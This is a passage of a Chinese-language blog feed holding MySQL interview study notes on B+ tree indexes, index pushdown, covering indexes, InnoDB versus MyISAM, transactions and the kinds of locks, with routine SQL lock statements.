适合范围查找：普通二分查找树</span><br><span class="line">   由于树是存储在磁盘中的，访问每个节点，都对应一次磁盘 I/O 操作（假设一个节点的大小「小于」操作系统的最小读写单位块的大小），也就是说树的高度就等于每次查询数据时磁盘 IO 操作的次数，所以树的高度越高，就会影响查询性能。</span><br><span class="line">2.  在 B+ 树中，叶子节点和非叶子节点的数据结构是一样的，区别在于，叶子节点存放的是实际的行数据，而非叶子节点存放的是主键和页号。</span><br><span class="line"></span><br><span class="line">### 【再问】为什么不用B树</span><br><span class="line">B树和B+的时间复杂度查找都是O(logN)，但是B 树可能会因为树的分支过多，导致需要进行多次磁盘访问。并且B+支持多级索引，很容易扩展。</span><br><span class="line">- 更适合磁盘存储：</span><br></pre></td></tr></table></figure><p>B+ 树的叶子节点形成了一个有序链表，这使得范围查询的效率非常高，因为相邻的元素会被存储在相邻的位置，可以在一个或者很少几个相邻的节点中找到所有需要的数据。<br>B+ 树的叶子节点包含了所有的数据记录，这意味着每次查找都可以直接定位到具体的数据行，而不需要额外的中间层节点来获取实际数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 支持多级索引</span><br><span class="line"></span><br><span class="line">B+ 树可以很容易地扩展为多级索引。在多级索引中，每一层都是一个独立的 B+ 树，它们之间通过指针进行连接。这样的设计使得在大量数据的情况下也可以保持高效的检索速度。</span><br></pre></td></tr></table></figure><p>举例来说，假设我们有一个三级索引 (a, b, c)，那么：<br>第一级索引以 a 为键构建一颗 B+ 树，每个节点中存储 b 的值以及指向第二级索引的指针。<br>第二级索引以 b 为键构建一颗 B+ 树，每个节点中存储 c 的值以及指向第三级索引的指针。<br>第三级索引以 c 为键构建一颗 B+ 树，叶子节点中存储了对应的数据记录。<br>这样的设计使得在多级索引中，每一层都能帮助缩小搜索范围，从而提高查询效</p><p>其中，叶子节点和非叶子节点的数据结构是一样的，区别在于，叶子节点存放的是实际的行数据，而非叶子节点存放的是主键和页号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">## 为什么B+ 和 B树</span><br><span class="line">- 从存储情况来说，B+只有叶子村数据，B树所有节点都有数据，这样就增加了磁盘IO次数</span><br><span class="line">- B+ 的非叶子结点仅有关键字，适合搜索</span><br><span class="line"></span><br><span class="line">B 树的内部节点既包含关键字也包含指向实际数据的指针，而 B+ 树的内部节点仅包含关键字，实际数据只存储在叶子节点中。这使得 B+ 树在磁盘存储和范围查询等方面具有优势，适合作为数据库索引的数据结构</span><br><span class="line"></span><br><span class="line">## 【面试】 索引失效的情况</span><br><span class="line">- 左/左右模糊匹配`like %a`</span><br><span class="line">- 使用函数，但是8.0之后出现了函数索引</span><br><span class="line">- 表达式计算</span><br><span class="line">- 隐式类型转换，比如name是varchar，查询时使用`select 8 from A where name=11111;`</span><br><span class="line">- 联合索引的非**最左匹配**：</span><br><span class="line">- WHERE 里面的 OR操作，导致全表扫描：OR 前的条件列是索引列，而在 OR 后的条件列不是索引列，解决办法将其都加上索引。</span><br><span class="line">## 【面试题】索引下推是什么，回表是什么</span><br><span class="line">- **explain会显示Extra字段为using index condition，表示使用了索引下推**</span><br><span class="line">- 回表也叫二次查询，指在数据库中执行一个查询，如果查询的字段不在查询的索引中，数据库可能需要通过索引定位到相应的行，然后再去实际的数据页中获取所需的字段值，这个过程就被称为回表。</span><br><span class="line">以索引举例，查了两个索引，那么就是先根据第一个索引找到符合要求的值，然后在这些行里用第二个索引进行过滤。</span><br><span class="line"></span><br><span class="line">截断的字段不会在 Server 层进行条件判断，而是会被下推到「存储引擎层」进行条件判断（因为 c 字段的值是在 (a, b, c) 联合索引里的），然后过滤出符合条件的数据后再返回给 Server 层。由于在引擎层就过滤掉大量的数据，无需再回表读取数据来进行判断，减少回表次数，从而提升了性能。</span><br><span class="line"></span><br><span class="line">## 【面试】最左匹配的一个问题：当where a=1 and c=3时，符合最左匹配吗</span><br><span class="line">答案：符合最左，只有a用了索引，c字段没使用</span><br><span class="line">严格意义上来说是属于索引截断。</span><br><span class="line"></span><br><span class="line">- MySQL 5.5 的话，前面 a 会走索引，在联合索引找到主键值后，开始回表，到主键索引读取数据行，Server 层从存储引擎层获取到数据行后，然后在 Server 层再比对 c 字段的值。</span><br><span class="line">- 从 MySQL 5.6 之后，有一个索引下推功能，可以在存储引擎层进行索引遍历过程中，对索引中包含的字段先做判断，直接过滤掉不满足条件的记录，再返还给 Server 层，从而减少回表次数。</span><br><span class="line">## 【面试】讲一下回表和索引下推的区别</span><br><span class="line">- **表是先通过索引查询行，再访问数据行涉及到两次磁盘访问**</span><br><span class="line">- **先在索引上执行一部分或全部的查询条件，大大减少磁盘访问次数**</span><br><span class="line"></span><br><span class="line">**表（Lookup）：**</span><br><span class="line"></span><br><span class="line">定义：</span><br><span class="line">回表是指在使用索引定位到符合查询条件的行后，再次访问实际的数据行，从中获取所需的字段值的过程。</span><br><span class="line"></span><br><span class="line">过程：</span><br><span class="line">使用索引定位到符合查询条件的行的位置。</span><br><span class="line">从定位到的位置中读取行的指针或主键。</span><br><span class="line">使用指针或主键再次访问实际的数据行，从中获取所需的字段值。</span><br><span class="line"></span><br><span class="line">代价：</span><br><span class="line">回表的代价相对较高，因为它涉及了两次磁盘/内存访问。</span><br><span class="line"></span><br><span class="line">**索引下推（Index Pushdown）：**</span><br><span class="line"></span><br><span class="line">定义：</span><br><span class="line">索引下推是指在查询执行过程中，数据库管理系统会尝试在索引上执行部分或全部的查询条件，从而减少需要访问实际数据行的次数。</span><br><span class="line"></span><br><span class="line">过程：</span><br><span class="line">当查询中的条件可以在索引中找到匹配项时，数据库会尝试在索引上执行这部分查询条件，以过滤掉不符合条件的行。 只有符合索引条件的行才会被返回给用户。</span><br><span class="line"></span><br><span class="line">优势：</span><br><span class="line">减少了回表的次数，降低了查询的代价，提高了查询的性能。</span><br><span class="line">减少了磁盘/内存访问次数，尤其在大型数据集中，效果显著。</span><br><span class="line"></span><br><span class="line">适用情况：</span><br><span class="line">索引下推通常在涉及到范围查询、排序、聚合等操作时可以发挥较大的优化作用。</span><br><span class="line"></span><br><span class="line">## Hash索引和B+树索引的区别？</span><br><span class="line"></span><br><span class="line">哈希索引**不支持排序**，因为哈希表是无序的。</span><br><span class="line">哈希索引**不支持范围查找**。</span><br><span class="line">哈希索引**不支持模糊查询**及组合索引的最左前缀匹配。</span><br><span class="line">因为哈希表中会存在哈希冲突，所以哈希索引的性能是**不稳定**的，</span><br><span class="line">而B+树索引的性能是**相对稳定的**，每次查询都是从根节点到叶子节点。</span><br><span class="line"></span><br><span class="line">## 为什么B+树比B树更适合实现数据库索引？</span><br><span class="line"></span><br><span class="line">- 由于B+树的数据都存储在叶子结点中，叶子结点均为索引，方便扫库，只需要扫一遍叶子结点即可，但是B树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以B+树更加适合在区间查询的情况，而在数据库中基于范围的查询是非常频繁的，所以通常B+树用于数据库索引。</span><br><span class="line"></span><br><span class="line">B+树的节点只存储索引key值，具体信息的地址存在于叶子节点的地址中。这就使以页为单位的索引中可以存放更多的节点。减少更多的I/O支出。</span><br><span class="line"></span><br><span class="line">B+树的查询效率更加稳定，任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当</span><br><span class="line"></span><br><span class="line">## 什么是覆盖索引？</span><br><span class="line"></span><br><span class="line">select的数据列只用从索引中就能够取得，不需要回表进行二次查询，也就是说查询列要被所使用的索引覆盖。对于innodb表的二级索引，如果索引能覆盖到查询的列，那么就可以避免对主键索引的二次查询。</span><br><span class="line"></span><br><span class="line">不是所有类型的索引都可以成为覆盖索引。覆盖索引要存储索引列的值，而哈希索引、全文索引不存储索引列的值，所以MySQL使用b+树索引做覆盖索引。</span><br><span class="line"></span><br><span class="line">对于使用了覆盖索引的查询，在查询前面使用explain，输出的extra列会显示为using index。</span><br><span class="line"></span><br><span class="line">比如user_like 用户点赞表，组合索引为(user_id, blog_id)，user_id和blog_id都不为null。</span><br><span class="line"></span><br><span class="line">```explain select blog_id from user_like where user_id = 13;</span><br></pre></td></tr></table></figure><p>explain结果的Extra列为Using index，查询的列被索引覆盖，并且where筛选条件符合最左前缀原则，通过索引查找就能直接找到符合条件的数据，不需要回表查询数据。</p><figure class="highlight plain"><figcaption><span>select user_id from user_like where blog_id </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">explain结果的Extra列为Using where; Using index， 查询的列被索引覆盖，where筛选条件不符合最左前缀原则，无法通过索引查找找到符合条件的数据，但可以通过索引扫描找到符合条件的数据，也不需要回表查询数据。</span><br><span class="line"></span><br><span class="line"># 数据库引擎</span><br><span class="line">## InnoDB存储引擎</span><br><span class="line"></span><br><span class="line">InnoDB是MySQL默认的事务型存储引擎，使用最广泛，基于**聚簇索引**建立的。InnoDB内部做了很多优化，如能够自动在内存中创建自适应hash索引，以加速读操作。</span><br><span class="line"></span><br><span class="line">**优点**：支持事务和崩溃修复能力；引入了行级锁和外键约束。</span><br><span class="line"></span><br><span class="line">**缺点**：占用的数据空间相对较大。</span><br><span class="line"></span><br><span class="line">**适用场景**：需要事务支持，并且有较高的并发读写频率。</span><br><span class="line">### 什么是聚集索引？</span><br><span class="line"></span><br><span class="line">InnoDB使用**表的主键构造主键索引树**，同时叶子节点中存放的即为整张表的记录数据。聚集索引叶子节点的存储是逻辑上连续的，使用双向链表连接，叶子节点按照主键的顺序排序，因此对于主键的排序查找和范围查找速度比较快。</span><br><span class="line"></span><br><span class="line">聚集索引的叶子节点就是整张表的行记录。InnoDB 主键使用的是聚簇索引。聚集索引要比非聚集索引查询效率高很多。</span><br><span class="line"></span><br><span class="line">对于InnoDB来说，聚集索引一般是表中的主键索引，如果表中没有显示指定主键，则会选择表中的第一个不允许为NULL的唯一索引。如果没有主键也没有合适的唯一索引，那么InnoDB内部会生成一个隐藏的主键作为聚集索引，这个隐藏的主键长度为6个字节，它的值会随着数据的插入自增。</span><br><span class="line"></span><br><span class="line">## MyISAM存储引擎</span><br><span class="line"></span><br><span class="line">数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，可以使用MyISAM引擎。MyISAM会将表存储在两个文件中，数据文件.MYD和索引文件.MYI。</span><br><span class="line"></span><br><span class="line">**优点**: 访问速度快。</span><br><span class="line"></span><br><span class="line">**缺点**：MyISAM不支持事务和行级锁，不支持崩溃后的安全恢复，也不支持外键。</span><br><span class="line"></span><br><span class="line">**适用场景**：对事务完整性没有要求；表的数据都会只读的。</span><br><span class="line"></span><br><span class="line">## InnoDB和MyISAM的区别</span><br><span class="line">1. myisam支持表锁，Innodb支持行锁，解决脏读和不可重复度</span><br><span class="line">2. myisam没有事务日志，innodb有binlog可以恢复数据库</span><br><span class="line">3. myisam数据存储是直接查到内存地址，innodb是有数据缓存，myisam更快一些</span><br><span class="line">4. 使用场景myisam适合读场景多，crud场景少的场景，比如博客这些；innodb适合事务支持，高并发等情况</span><br><span class="line">## 两者索引的区别【非聚簇索引myisam，看3.】</span><br><span class="line">1. myisam使用非聚簇索引，B树，innodb使用聚簇索引，B+树</span><br><span class="line">2. myisam的索引和数据存储是分开的，聚簇索引是将数据和索引存储在一起</span><br><span class="line">3. 将数据存储于索引分开结构，索引结构的叶子节点指向了数 据的对应行，myisam 通 过 key_buffer 把索引先缓存到内存中，当需要访问 数据时(通过索引访问数据)，在内存中直接 搜索索引，然后通过索引找 到磁盘相应数据，这也就是为什么索引不在 key buffer 命中时，速度慢 的 原因。</span><br><span class="line">## 【面试】为什么innodb用b+而不用b树</span><br><span class="line">b+树在范围查询和顺序访问上有优势：</span><br><span class="line">b+树叶子节点形成了一个有序链表，有利于范围查询和顺序访问，不需遍历整棵树</span><br><span class="line">## 【重点】为什么innodb比myisam慢了点</span><br><span class="line">- myisam是非聚簇，索引和数据是分开的，在查询时，可以直接访问到索引文件，而不需要额外的查找操作。</span><br><span class="line">- 而在 InnoDB 中，由于使用了聚簇索引，查询时可能需要在索引中定位到主键，再根据主键访问数据行</span><br><span class="line"># 事务Transaction</span><br><span class="line">## InnoDB 引擎通过什么技术来保证事务的这ACID特性的？</span><br><span class="line"></span><br><span class="line">- 持久性Durability是通过 redo log（重做日志）来保证的；</span><br><span class="line">- 原子性Atomicity 是通过 undo log（回滚日志）来保证的；</span><br><span class="line">- 隔离性Isolation是通过 MVCC（多版本并发控制） 或锁机制来保证的；</span><br><span class="line">- 一致性Consistency则是通过持久性+原子性+隔离性来保证；</span><br><span class="line"></span><br><span class="line">*MySQL 并不会使用「串行化」隔离级别来避免幻读现象的发生，因为使用「串行化」隔离级别会影响性能*</span><br><span class="line">https://xiaolincoding.com/mysql/transaction/phantom.html#什么是幻读</span><br><span class="line">## 可重复读隔离级别是启动事务时生成一个 Read View，然后整个事务期间都在用这个 Read View。</span><br><span class="line"></span><br><span class="line">## 【面试题】为什么事务要有隔离性，我们就要知道并发事务时会引发什么问题。</span><br><span class="line">数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致，因为多个事务同时使用相同的数据时，不会相互干扰，每个事务都有一个完整的数据空间，对其他并发事务是隔离的。</span><br><span class="line"></span><br><span class="line">## 多事务的并发进行一般会造成以下几个问题: </span><br><span class="line"></span><br><span class="line">锁：共享锁和排他锁（读写锁）</span><br><span class="line"></span><br><span class="line"># 【面试重点】锁</span><br><span class="line">锁分为全局锁，表锁，行锁，下面介绍各锁的使用和场景</span><br><span class="line">## 全局锁</span><br><span class="line">**应用场景**：全局锁主要应用于做全库逻辑备份，这样在备份数据库期间，不会因为数据或表结构的更新，而出现备份文件的数据与预期的不一样。</span><br><span class="line"></span><br><span class="line">**缺点**：意味着整个数据库都是只读状态，备份花时间长，无法执行其他操作。</span><br><span class="line">但是MYSQL解决了这个问题，通过**可重复度**，使用ReadView，事务操作时用ReadView，MVCC支持备份与事务同时进行。</span><br><span class="line"></span><br><span class="line">- 上锁1`flush tables with READ lock;`锁定所有的表，防止其他会话对这些表进行写操作，但允许读操作</span><br><span class="line">- 上锁2`lock tables [tablename] READ/WRITE`</span><br><span class="line">- `unlock tables;`</span><br><span class="line"></span><br><span class="line">## 表级锁</span><br><span class="line">### 表锁</span><br><span class="line">**应用场景**:表级别的共享锁=读锁,独占锁=写锁</span><br><span class="line">- 尽量避免在使用 InnoDB 引擎的表使用表锁，因为表锁的颗粒度太大，会影响并发性能</span><br><span class="line">- `lock tables [tablename] read/write;` </span><br><span class="line">### 元数据锁</span><br><span class="line">**应用场景**不需要显式使用，在CRUD/alter中自动创建，select执行完才可以执行其他操作，</span><br><span class="line">- MDL 是在事务提交后才会释放，这意味着事务执行期间，MDL 是一直持有的。</span><br><span class="line">  </span><br><span class="line">【引申问题】</span><br><span class="line">那如果数据库有一个长事务（所谓的长事务，就是开启了事务，但是一直还没提交），</span><br><span class="line">首先，线程 A 先启用了事务（但是一直不提交），然后执行一条 select 语句，此时就先对该表加上 MDL 读锁；</span><br><span class="line"></span><br><span class="line">然后，线程 B 也执行了同样的 select 语句，此时并不会阻塞，因为「读读」并不冲突；</span><br><span class="line"></span><br><span class="line">接着，线程 C 修改了表字段，此时由于线程 A 的事务并没有提交，也就是 MDL 读锁还在占用着，这时线程 C 就无法申请到 MDL 写锁，就会被阻塞，</span><br><span class="line"></span><br><span class="line">那么在线程 C 阻塞后，后续有对该表的 select 语句，就都会被阻塞，如果此时有大量该表的 select 语句的请求到来，就会有大量的线程被阻塞住，这时数据库的线程很快就会爆满了。</span><br><span class="line"></span><br><span class="line">**那么为什么线程 C 因为申请不到 MDL 写锁，而导致后续的申请读锁的查询操作也会被阻塞？**</span><br><span class="line"></span><br><span class="line">因为申请 MDL 锁的操作会形成一个队列，队列中写锁获取优先级高于读锁，一旦出现 MDL 写锁等待，会阻塞后续该表的所有 CRUD 操作。</span><br><span class="line"></span><br><span class="line">### 意向锁</span><br><span class="line">**用于快速判断表是否加了锁**。因为：</span><br><span class="line"></span><br><span class="line">如果没有「意向锁」，那么加「独占表锁」时，就需要遍历表里所有记录，查看是否有记录存在独占锁，这样效率会很慢。</span><br><span class="line"></span><br><span class="line">### 自增锁</span><br><span class="line">```java</span><br><span class="line">@Id</span><br><span class="line">@GeneratedValue(strategy = GenerationType.IDENTITY) // 指定自动生成主键的策略</span><br><span class="line">@Column(name = &quot;id&quot;)</span><br><span class="line">private int id;</span><br></pre></td></tr></table></figure><p>在插入数据的时候，会为被 AUTO_INCREMENT 修饰的字段加上轻量级锁，然后给该字段赋值一个自增的值，就把这个轻量级锁释放了，而不需要等待整个插入语句执行完后才释放锁。</p><p><strong>应用场景</strong></p><h2 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h2><p><strong>记录锁 Record Lock</strong>，仅仅把一条记录锁上；</p><p><strong>间隙锁 Gap Lock</strong>，锁定一个范围，但是不包含记录本身；间隙锁的意义只在于阻止区间被插入</p><p><strong>临键锁 Next-Key Lock</strong>：Record Lock + Gap Lock 的组合，锁定一个范围，并且锁定记录本身。</p><ul><li>【普通的select没有行锁】普通的 select 是不会加行级锁的，普通的 select 语句是利用 MVCC 实现一致性读，是无锁的。<h3 id="记录锁-Record-Lock"><a href="#记录锁-Record-Lock" class="headerlink" title="记录锁 Record Lock"></a>记录锁 Record Lock</h3>记录锁分为S锁和X锁。</li><li>当一个事务对一条记录加了 S 型记录锁后，其他事务也可以继续对该记录加 S 型记录锁（S 型与 S 锁兼容），但是不可以对该记录加 X 型记录锁（S 型与 X 锁不兼容）;</li><li>当一个事务对一条记录加了 X 型记录锁后，其他事务既不可以对该记录加 S 型记录锁（S 型与 X 锁不兼容），也不可以对该记录加 X 型记录锁（X 型与 X 锁不兼容）。<h3 id="间隙锁-Gap-Lock"><a href="#间隙锁-Gap-Lock" class="headerlink" title="间隙锁 Gap Lock"></a>间隙锁 Gap Lock</h3>只存在于可重复读隔离级别，目的是为了解决可重复读隔离级别下幻读的现象。</li><li>对间隙加锁是为了防止插入/删除的时候出现幻读</li><li>间隙锁之间是兼容的，即两个事务可以同时持有包含共同间隙范围的间隙锁，并不存在互斥关系，因为间隙锁的目的是防止插入幻影记录而提出的。<h3 id="临键锁-Next-key-Lock"><a href="#临键锁-Next-key-Lock" class="headerlink" title="临键锁 Next-key Lock"></a>临键锁 Next-key Lock</h3>理解为一个范围的间隙锁</li></ul><h2 id="【面试题】MYSQL怎么加锁"><a href="#【面试题】MYSQL怎么加锁" class="headerlink" title="【面试题】MYSQL怎么加锁"></a>【面试题】MYSQL怎么加锁</h2><ol><li>【加行锁】在查询时对记录加行级锁，这两种查询会加锁的语句称为锁定读。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//对读取的记录加共享锁(S型锁)</span><br><span class="line"><span class="keyword">select</span> ... <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>;</span><br><span class="line"></span><br><span class="line">//对读取的记录加独占锁(X型锁)</span><br><span class="line"><span class="keyword">select</span> ... <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line">//对操作的记录加独占锁(X型锁)</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">table</span> .... <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">//对操作的记录加独占锁(X型锁)</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li></ol><p>上面这两条语句必须在一个事务中，因为当事务提交了，锁就会被释放，所以在使用这两条语句的时候，要加上 begin 或者 start transaction 开启事务的语句。</p><h3 id="普通查询，没有使用索引的话，会导致什么情况？"><a href="#普通查询，没有使用索引的话，会导致什么情况？" class="headerlink" title="普通查询，没有使用索引的话，会导致什么情况？"></a>普通查询，没有使用索引的话，会导致什么情况？</h3><p>没有使用索引字段作查询条件的话，导致扫描是全表扫描。那么，每一条记录的索引上都会加 临键（NK）锁，这样就相当于锁住的全表，这时如果其他事务对该表进行增、删、改操作的时候，都会被阻塞。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://cdn.xiaolincoding.com//mysql/other/3c3af16e7a948833ccb6409e8b51daf8.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>如果在 update 语句的 where 条件没有使用索引，就会全表扫描，于是就会对所有记录加上 next-key 锁（记录锁 + 间隙锁），相当于把整个表锁住了。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://cdn.xiaolincoding.com//mysql/other/1aa886fe95e7bc791c296e2d342fa435.png" alt title>                </div>                <div class="image-caption"></div>            </figure>这条 update 语句产生了 4 个记录锁（有几条记录就有几个Record锁）和 5 个间隙锁（范围+1），相当于锁住了全表。</li></ul><h3 id="那-update-语句的-where-带上索引就能避免全表记录加锁了吗？"><a href="#那-update-语句的-where-带上索引就能避免全表记录加锁了吗？" class="headerlink" title="那 update 语句的 where 带上索引就能避免全表记录加锁了吗？"></a>那 update 语句的 where 带上索引就能避免全表记录加锁了吗？</h3><p>关键还得看这条语句在执行过程种，优化器最终选择的是索引扫描，还是全表扫描，如果走了全表扫描，就会对全表的记录加锁了。</p><h3 id="update-没加索引，加的是表锁还是行锁"><a href="#update-没加索引，加的是表锁还是行锁" class="headerlink" title="update 没加索引，加的是表锁还是行锁"></a>update 没加索引，加的是表锁还是行锁</h3><p>对每一行都加了NK锁，就锁了整张表。</p><h3 id="避免全表锁定"><a href="#避免全表锁定" class="headerlink" title="避免全表锁定"></a>避免全表锁定</h3><p>将 MySQL 里的 <strong>sql_safe_updates 参数设置为 1</strong>，开启安全更新模式。</p><ul><li><p>update 语句必须满足如下条件之一才能执行成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 where，并且 where 条件中必须有索引列；</span><br><span class="line">使用 limit；</span><br><span class="line">同时使用 where 和 limit，此时 where 条件中可以没有索引列；</span><br></pre></td></tr></table></figure></li><li><p>delete 语句必须满足以下条件能执行成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同时使用 where 和 limit，此时 where 条件中可以没有索引列；</span><br><span class="line"></span><br><span class="line">另外：如果 where 条件带上了索引列，但是优化器最终扫描选择的是全表，而不是索引的话，我们可以使用 FORCE INDEX([index_name]) 可以告诉优化器使用哪个索引，以此避免有几率锁全表带来的隐患。</span><br></pre></td></tr></table></figure></li></ul><h2 id="MySQL-记录锁-间隙锁可以防止删除操作而导致的幻读吗？【可以】"><a href="#MySQL-记录锁-间隙锁可以防止删除操作而导致的幻读吗？【可以】" class="headerlink" title="MySQL 记录锁+间隙锁可以防止删除操作而导致的幻读吗？【可以】"></a>MySQL 记录锁+间隙锁可以防止删除操作而导致的幻读吗？【可以】</h2><h3 id="插入意向锁"><a href="#插入意向锁" class="headerlink" title="插入意向锁"></a>插入意向锁</h3><p>插入意向锁的生成时机：</p><p>每插入一条新记录，都需要看一下待插入记录的下一条记录上是否已经被加了间隙锁，如果已加间隙锁，此时会生成一个插入意向锁，然后锁的状态设置为等待状态（PS：MySQL 加锁时，是先生成锁结构，然后设置锁的状态，如果锁状态是等待状态，并不是意味着事务成功获取到了锁，只有当锁状态为正常状态时，才代表事务成功获取到了锁），现象就是 Insert 语句会被阻塞。<br>#</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL questions</title>
      <link href="/2023/01/03/2023-01-03-%E9%9D%A2%E7%BB%8FMySQL%E9%97%AE%E9%A2%98/"/>
      <url>/2023/01/03/2023-01-03-%E9%9D%A2%E7%BB%8FMySQL%E9%97%AE%E9%A2%98/</url>
      
